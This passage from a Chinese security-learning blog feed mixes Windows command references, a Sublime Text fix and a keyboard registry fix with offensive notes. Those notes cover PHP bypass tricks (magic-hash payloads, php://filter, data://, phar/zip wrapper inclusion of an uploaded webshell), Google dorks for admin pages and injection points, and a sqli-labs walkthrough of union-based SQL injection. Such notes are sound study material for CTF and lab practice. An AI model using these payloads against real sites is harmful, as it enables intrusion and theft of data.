/release6        释放指定适配器的 IPv6 地址。</span><br><span class="line">       /renew           更新指定适配器的 IPv4 地址。</span><br><span class="line">       /renew6          更新指定适配器的 IPv6 地址。</span><br><span class="line">       /flushdns        清除 DNS 解析程序缓存。</span><br><span class="line">       /registerdns     刷新所有 DHCP 租用并重新注册 DNS 名称</span><br><span class="line">       /displaydns      显示 DNS 解析程序缓存的内容。</span><br><span class="line">       /showclassid     显示适配器允许的所有 DHCP 类 ID。</span><br><span class="line">       /setclassid      修改 DHCP 类 ID。</span><br><span class="line">       /showclassid6    显示适配器允许的所有 IPv6 DHCP 类 ID。</span><br><span class="line">       /setclassid6     修改 IPv6 DHCP 类 ID。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">默认情况下，仅显示绑定到 TCP/IP 的每个适配器的 IP 地址、子网掩码和</span><br><span class="line">默认网关。</span><br><span class="line"></span><br><span class="line">对于 Release 和 Renew，如果未指定适配器名称，则会释放或更新所有绑定</span><br><span class="line">到 TCP/IP 的适配器的 IP 地址租用。</span><br><span class="line"></span><br><span class="line">对于 Setclassid 和 Setclassid6，如果未指定 ClassId，则会删除 ClassId。</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">    &gt; ipconfig                       ... 显示信息</span><br><span class="line">    &gt; ipconfig /all                  ... 显示详细信息</span><br><span class="line">    &gt; ipconfig /renew                ... 更新所有适配器</span><br><span class="line">    &gt; ipconfig /renew EL*            ... 更新所有名称以 EL 开头</span><br><span class="line">                                         的连接</span><br><span class="line">    &gt; ipconfig /release *Con*        ... 释放所有匹配的连接，</span><br><span class="line">                                         例如“有线以太网连接 1”或</span><br><span class="line">                                             “有线以太网连接 2”</span><br><span class="line">    &gt; ipconfig /allcompartments      ... 显示有关所有隔离舱的</span><br><span class="line">                                         信息</span><br><span class="line">    &gt; ipconfig /allcompartments /all ... 显示有关所有隔离舱的</span><br><span class="line">                                         详细信息</span><br><span class="line"></span><br><span class="line">在排查DNS故障时，经常使用该命令  ipconfig /flushdns来清除dns缓存</span><br></pre></td></tr></table></figure><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tasklist -- 显示运行的所有进程</span><br><span class="line">ver -- 显示系统版本号</span><br><span class="line">ipconfig -- 显示当前 TCP/IP 网络配置</span><br><span class="line">systeminfo -- 显示关于计算机及其操作系统的详细配置信息</span><br><span class="line">netstat -- 显示网络连接、路由表和网络接口信息</span><br><span class="line">qprocess -- 显示 RD 会话主机服务器上正在运行的进程的相关信息</span><br><span class="line">query -- 显示进程、会话和 RD 会话主机服务器的相关信息</span><br><span class="line">type -- 显示文本文件的内容</span><br><span class="line">at -- 计划任务</span><br><span class="line">reg -- 注册表操作</span><br><span class="line">wmic -- 提供了从命令行接口和批命令脚本执行系统管理的支持</span><br><span class="line">wusa -- 安装补丁</span><br><span class="line">netsh advfirewall -- 管理防火墙</span><br><span class="line">sc -- 用来和NT服务控制器和服务进行通讯的命令行程序</span><br><span class="line">rundll32 -- 调用动态链接程序库</span><br></pre></td></tr></table></figure><p><a href="http://www.nicky1605.net/102.html" target="_blank" rel="noopener">net命令详解参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;nslookup&quot;&gt;&lt;a href=&quot;#nslookup&quot; class=&quot;headerlink&quot; title=&quot;nslookup&quot;&gt;&lt;/a&gt;nslookup&lt;/h3&gt;&lt;p&gt;nslookup命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>PHP函数漏洞集</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/06/08/PHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E9%9B%86/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/06/08/PHP函数漏洞集/</id>
    <published>2018-06-08T08:45:43.000Z</published>
    <updated>2018-07-08T08:47:15.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>preg_match<br>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ip = &apos;1.1.1.1 abcd&apos;; // 可以绕过</span><br><span class="line">if(!preg_match(&quot;/(\d+)\.(\d+)\.(\d+)\.(\d+)/&quot;,$ip)) &#123;</span><br><span class="line">  die(&apos;error&apos;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  // echo(&apos;key...&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ereg %00 截断<br>ereg 读到 %00 的时候，就截止了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&apos;a&apos;]) === FALSE)  &#123;</span><br><span class="line">        echo &apos;You password must be alphabet&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p> a=abcd%001234，可以绕过<br><code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE</code><br>字符串对比解析<br>在这里如果 $_GET[‘password’]为数组，则返回值为NULL<br>如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true<br>其余为false</p><h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    echo 0 == &apos;a&apos; ;// a 转换为数字为 0    重点注意</span><br><span class="line">    // 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span><br><span class="line">    // 十六进制与整数，被转换为同一进制比较</span><br><span class="line">    &apos;0xccccccccc&apos; == &apos;54975581388&apos; ;</span><br><span class="line"></span><br><span class="line">    // 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span><br><span class="line">    1 == &apos;1&apos;;</span><br><span class="line">    1 == &apos;01&apos;;</span><br><span class="line">    10 == &apos;1e1&apos;;</span><br><span class="line">    &apos;100&apos; == &apos;1e2&apos; ;    </span><br><span class="line"></span><br><span class="line">    // 十六进制数与带空格十六进制数，被转换为十六进制整数</span><br><span class="line">    &apos;0xABCdef&apos;  == &apos;     0xABCdef&apos;;</span><br><span class="line">    echo &apos;0010e2&apos; == &apos;1e3&apos;;</span><br><span class="line">    // 0e 开头会被当成数字，又是等于 0*10^xxx=0</span><br><span class="line">    // 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过</span><br><span class="line">    &apos;0e509367213418206700842008763514&apos; == &apos;0e481036490867661113260034900752&apos;;</span><br><span class="line">    &apos;0e481036490867661113260034900752&apos; == &apos;0&apos; ;</span><br><span class="line"></span><br><span class="line">    var_dump(md5(&apos;240610708&apos;) == md5(&apos;QNKCDZO&apos;));</span><br><span class="line">    var_dump(md5(&apos;aabg7XSs&apos;) == md5(&apos;aabC9RqS&apos;));</span><br><span class="line">    var_dump(sha1(&apos;aaroZmOk&apos;) == sha1(&apos;aaK1STfY&apos;));</span><br><span class="line">    var_dump(sha1(&apos;aaO8zKZF&apos;) == sha1(&apos;aa3OFF9m&apos;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?page=upload</span><br><span class="line">这种 url 很容易就能想到可能是文件包含或者伪协议读取</span><br><span class="line">http://127.0.0.1/index.php?page=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>写入文件， 数据利用 POST 传过去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://input</span><br></pre></td></tr></table></figure></p><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>将 include 的文件流重定向到用户控制的输入流<br><code>test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==</code><br>可以用于控制 file_get_contents 的内容为用户输入的流<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file=$_GET[&apos;file&apos;];</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure></p><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。<br>写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含<br>这里的路径为上传的 jpg 文件在服务器的路径<br><code>/index.php?id=phar://路径/xxx.jpg/shell</code></p><h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>上述 phar:// 的方法也可以使用 zip://<br>然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。<br>1.zip文件内仅有1.php这个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/php?file=zip://1.png%231.php  </span><br><span class="line">// 也可以尝试不改名为png，直接使用zip上传测试一下</span><br><span class="line">/php?file=zip://1.zip%231.php</span><br></pre></td></tr></table></figure></p><h3 id="MD5-compare漏洞"><a href="#MD5-compare漏洞" class="headerlink" title="MD5 compare漏洞"></a>MD5 compare漏洞</h3><p>PHP在处理哈希字符串时，如果利用”!=”或”==”来对哈希值进行比较，它把每一个以”0x”开头的哈希值都解释为科学计数法0的多少次方（为0），所以如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么php将会认为他们相同。<br>常见的payload有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x01 md5(str)</span><br><span class="line">    QNKCDZO</span><br><span class="line">    240610708</span><br><span class="line">    s878926199a</span><br><span class="line">    s155964671a</span><br><span class="line">    s214587387a</span><br><span class="line">    s214587387a</span><br><span class="line">0x02 sha1(str)</span><br><span class="line">    sha1(&apos;aaroZmOk&apos;)  </span><br><span class="line">    sha1(&apos;aaK1STfY&apos;)</span><br><span class="line">    sha1(&apos;aaO8zKZF&apos;)</span><br><span class="line">    sha1(&apos;aa3OFF9m&apos;)</span><br></pre></td></tr></table></figure></p><p>同时MD5不能处理数组，若有以下判断则可用数组绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(@md5($_GET[&apos;a&apos;]) == @md5($_GET[&apos;b&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;yes&quot;;</span><br><span class="line">&#125;</span><br><span class="line">//http://127.0.0.1/1.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></p><p><a href="https://blog.csdn.net/hitwangpeng/article/details/45972099" target="_blank" rel="noopener">变量覆盖</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;正则表达式&quot;&gt;&lt;a href=&quot;#正则表达式&quot; class=&quot;headerlink&quot; title=&quot;正则表达式&quot;&gt;&lt;/a&gt;正则表达式&lt;/h3&gt;&lt;p&gt;preg_match&lt;br&gt;如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="PHP" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Google Hack</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/05/13/GoogleHack/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/05/13/GoogleHack/</id>
    <published>2018-05-13T07:13:51.000Z</published>
    <updated>2018-08-02T03:17:07.364Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>site</td><td>指定域名</td><td></td></tr><tr><td>intitle</td><td>标题中存在关键字的网页</td><td></td></tr><tr><td>intext</td><td>标题中存在关键字的网页</td><td></td></tr><tr><td>info</td><td>一些基本信息</td><td></td></tr><tr><td>inur</td><td>URL存在关键字的网页</td><td></td></tr><tr><td>filetype</td><td>搜索指定文件类型</td><td></td></tr></tbody></table><p>案例一：搜索存在敏感信息的网站<br>输入：<code>intitle:管理登录 filetype:php</code>,这句话的意思为查询网页标题含有“管理登录”，并且为php类型的网站，Google可以轻松搜索到很多该类网站<br>案例二：搜集Discuz论坛主机<br>语法为：<code>intext:Powered by Discuz</code><br>案例三:搜索有注入点的网站<br>语法:<code>inurl:?id=</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;关键字&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;site&lt;/td&gt;
&lt;td&gt;指定域名&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;intitle&lt;/td&gt;

      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Web Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Web-Security/"/>
    
  </entry>
  
  <entry>
    <title>sublime text不能安装插件，错误提示</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/05/06/sublime/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/05/06/sublime/</id>
    <published>2018-05-06T04:59:07.000Z</published>
    <updated>2018-09-14T09:07:31.819Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sublime-text不能安装插件，错误提示There-are-no-packages-available-for-installation。"><a href="#sublime-text不能安装插件，错误提示There-are-no-packages-available-for-installation。" class="headerlink" title="sublime text不能安装插件，错误提示There are no packages available for installation。"></a>sublime text不能安装插件，错误提示There are no packages available for installation。</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>1、cmd下输入<code>ping sublime.wbond.net</code><br>记录返回的IP地址<br>2、将上一步得到的IP地址加入到本机hosts文件中，hosts文件所在目录为C:\Windows\System32\drivers\etc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#sublime</span><br><span class="line">第一步的IP地址       sublime.wbond.net.</span><br><span class="line">#end</span><br></pre></td></tr></table></figure></p><p>4、修改后保存，重启sublime</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>一、先安装<code>Package Control.sublime-package</code>到Sublime Text\Packages下面<br><a href="https://pan.baidu.com/s/1N1RKJrMh2nlzLgwm-r2QDQ" target="_blank" rel="noopener">下载链接</a> 密码：<code>viuc</code><br>二、安装REPL<br>1、手动下载sublimeREPL插件<em><a href="https://github.com/wuub/SublimeREPL">https://github.com/wuub/SublimeREPL</a></em>，将其解压到sublime Text\Data\Packages目录下<br>2、打开\sublime Text\Data\Packages\sublimeREPL\config\python\Main.sublime-menu文件，找到”id”为”reply_python”的段落，将”cmd”的属性改为<code>[&quot;python&quot;, &quot;-i&quot;, &quot;-u&quot;, &quot;$file_basename&quot;]</code><br>这样相当于将SublimeREPL的python交互环境的命令改为运行当前文件的交互环境，如果还想保留以前的功能，可以自己添加一个这样的节点，注意id值要取名为唯一的id值。<br>3、设置快捷键<br>点击首选项-&gt;按键绑定-用户，然后在弹出的文件中输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">&#123; &quot;keys&quot;: [&quot;alt+q&quot;], &quot;command&quot;: &quot;repl_open&quot;,   </span><br><span class="line">             &quot;caption&quot;: &quot;Python&quot;,  </span><br><span class="line">             &quot;mnemonic&quot;: &quot;p&quot;,  </span><br><span class="line">             &quot;args&quot;: &#123;  </span><br><span class="line">             &quot;type&quot;: &quot;subprocess&quot;,  </span><br><span class="line">             &quot;encoding&quot;: &quot;utf8&quot;,  </span><br><span class="line">             &quot;cmd&quot;: [&quot;python&quot;, &quot;-i&quot;, &quot;-u&quot;, &quot;$file&quot;],  </span><br><span class="line">             &quot;cwd&quot;: &quot;$file_path&quot;,  </span><br><span class="line">             &quot;syntax&quot;: &quot;Packages/Python/Python.tmLanguage&quot;,  </span><br><span class="line">             &quot;external_id&quot;: &quot;python&quot;  </span><br><span class="line">             &#125;   </span><br><span class="line">&#125;  </span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>本文仅定义了Python - RUN current file的快捷键，这里使用的是alt+q，可以根据自己的需要进行灵活的调整。<br>为了调试方便，我们可以把这个窗口放到右边，先设置sublime的窗口显示为多层，点击查看-&gt;布局-&gt;列数 2列<br>方法二参考<em><a href="https://blog.csdn.net/zhihaoma/article/details/51132755" target="_blank" rel="noopener">https://blog.csdn.net/zhihaoma/article/details/51132755</a></em><br><a href="https://blog.csdn.net/feilong_csdn/article/details/67638660" target="_blank" rel="noopener">其他方法参考</a><br></p><p>Sublime默认主题配置</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-aaf3f055b8094295.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="sublime主题.jpg"></p><h4 id="Sublime-透明度设置"><a href="#Sublime-透明度设置" class="headerlink" title="Sublime 透明度设置"></a>Sublime 透明度设置</h4><p>设置透明度包<a href="https://pan.baidu.com/s/1EI8lRpxjGzlXaVZkVeO6fA" target="_blank" rel="noopener">下载链接</a>密码：t89y</p><p>Sublime安装包下面有Data目录的<a href="https://pan.baidu.com/s/1xdT6gZjM_ZkcvlZIGifxDA" target="_blank" rel="noopener">下载链接</a> 密码：rysf，直接将设置透明度的Package放入Data目录下面的Package下面即可</p><p>没有Data目录的<a href="https://pan.baidu.com/s/1Bg-2mbjYX4NG9Q8D8ufzUQ" target="_blank" rel="noopener">下载链接</a>，密码：kpwm，需要将设置透明度的Package放在sublime的Package目录下，点击 Sublime Text3 的 <code>Preferences -&gt; Browse Packages</code> 打开 Packages 存放目录，将文件放入，并重命名为SublimeTextTrans，然后在<code>Preferences -&gt; Package Setting -&gt; SublimeTextTrans -&gt; Setting - User</code> 就可以设置透明度的级别了。</p><p>也可以通过 <code>Ctrl+Shift+1、2、3、4、5、6</code> 加载默认的 6 个透明级别。默认的透明级别在 <code>Preferences -&gt; Package Setting -&gt; SublimeTextTrans -&gt; Setting - Default</code> 中可以查</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;sublime-text不能安装插件，错误提示There-are-no-packages-available-for-installation。&quot;&gt;&lt;a href=&quot;#sublime-text不能安装插件，错误提示There-are-no-packages-ava
      
    
    </summary>
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>win10开机键盘无法使用问题</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/05/05/%E9%94%AE%E7%9B%98%E9%97%AE%E9%A2%98/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/05/05/键盘问题/</id>
    <published>2018-05-05T03:17:37.000Z</published>
    <updated>2018-05-05T03:23:57.730Z</updated>
    
    <content type="html"><![CDATA[<p>电脑开机外置键盘无法使用<br>进入设备管理器发现键盘下的<code>PC/AT 增强型PS/2键盘</code>驱动为感叹号<br>打开注册表，此时键盘无法使用，那就进入C盘Windows文件下双击regedit.exe文件打开注册表，依次进入<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}</code><br>删除UpperFilters项<br>在设备管理器下的键盘选项里删除<code>PC/AT 增强型PS/2键盘</code><br>卸载此设备，重新启动。<br>此时安装驱动会提示错误代码10，该设备无法启动。</p><p>接着修改注册表：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}</code><br>添加字符串<code>UpperFilters</code>项，内容为<code>kbdclass</code><br>卸载设备，重新启动。<br>重新启动后问题得以解决。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;电脑开机外置键盘无法使用&lt;br&gt;进入设备管理器发现键盘下的&lt;code&gt;PC/AT 增强型PS/2键盘&lt;/code&gt;驱动为感叹号&lt;br&gt;打开注册表，此时键盘无法使用，那就进入C盘Windows文件下双击regedit.exe文件打开注册表，依次进入&lt;code&gt;HKEY_LOC
      
    
    </summary>
    
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/05/01/sqli-lab/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/05/01/sqli-lab/</id>
    <published>2018-05-01T04:57:30.000Z</published>
    <updated>2018-08-16T04:58:29.349Z</updated>
    
    <content type="html"><![CDATA[<p>1、 sqli-labs需要lamp或wamp环境，本机使用wamp环境，使用phpstudy的集成环境<br>2、 Sqli-labs的安装，下载sqli-labs，解压到本地www目录下，打开WWW\sqli-labs\sql-connections文件下的db-creds.inc文件，修改mysql账户和密码和本机mysql数据库账户和密码一致<br>3、 浏览器输入<a href="http://127.0.0.1/sqli-labs" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs</a>，单击<a href="http://127.0.0.1/sqli-labs/sql-connections/setup-db.php" target="_blank" rel="noopener">Setup/reset Database for labs</a><img src="https://upload-images.jianshu.io/upload_images/9464729-db246f22cc6a1a6c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>此时sqli-labs平台已经搭建好了<br><img src="https://upload-images.jianshu.io/upload_images/9464729-2dd69740cfe62cd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>选择第一关，<br>让输入一个参数进入，那就先传入?id=1吧<br><strong>1、先判断是字符型还是整数型</strong><br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1</a><br><img src="https://upload-images.jianshu.io/upload_images/9464729-b53f23ef0fe6340e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a><br><img src="https://upload-images.jianshu.io/upload_images/9464729-25f7d725286ab70b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>进一步判断，<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> and ‘1’=’1 ，页面正常<br><img src="https://upload-images.jianshu.io/upload_images/9464729-5ddd60d24630c02c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> and ‘1’=’2<img src="https://upload-images.jianshu.io/upload_images/9464729-99e6bf75276f290a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>确定是<strong>字符型注入</strong><br><strong>2、判断查询列数</strong><br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> order by 4–+<br><img src="https://upload-images.jianshu.io/upload_images/9464729-a13138e1237a7f22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>报错，未知的4列，那就试一下3<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> order by 3–+<br><img src="https://upload-images.jianshu.io/upload_images/9464729-28866502deb6c421.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>现在知道是有三列了<br><strong>3、判断显示位</strong><br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=-1</a>‘ union select 1,2,3–+<br><img src="https://upload-images.jianshu.io/upload_images/9464729-21edd8045e3fca47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>查询所使用的数据库，以及数据库版本，大于5.0版本的数据库存在information_schema库,<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,database(),version()–+<br><img src="https://upload-images.jianshu.io/upload_images/9464729-46781cc1dc342d8f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><strong>4、</strong> <strong>获取所有数据库名</strong><br><strong><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),2–+</strong><img src="https://upload-images.jianshu.io/upload_images/9464729-4bae0024dd4fcfc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>5、</strong> <strong>获取数据库所有表名</strong><br>Sqli-labs使用的数据库是security<br>查询数据库中所有表：<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),2–+</p><p><img src="https://upload-images.jianshu.io/upload_images/9464729-0457181fcf474dcb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>6、</strong> <strong>获取表中所有字段</strong><br>Users表中存放用户信息，来查看一下<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),2–+<br><img 